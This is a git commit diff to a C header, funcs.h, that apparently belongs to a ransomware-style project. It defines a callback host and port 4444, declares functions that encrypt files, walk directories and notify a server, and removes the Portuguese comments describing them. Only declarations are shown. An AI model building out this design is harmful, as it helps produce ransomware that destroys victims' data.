6c24b250baa6dd63c117d75deab3b1d162499a66
KvN0X00 <65466003+Kanui-C@users.noreply.github.com>
2021-04-14 11:08:58 -0300

    Update funcs.h

--- libs/funcs.h
+++ libs/funcs.h
@@ -4,12 +4,10 @@
 #define myhost "192.168.0.103"
 #define myport 4444
 
-
-//Funçao que avisa o servidor que algum host foi criptografado
 void connectserver();
-//Funçao que faz a criptografia de arquivos
+
 void encryptfile(char *encryptfile);
-//Funçao que procura arquivos & diretorios
+
 void WhatIsDir(char *name_dir);
 
 #endif
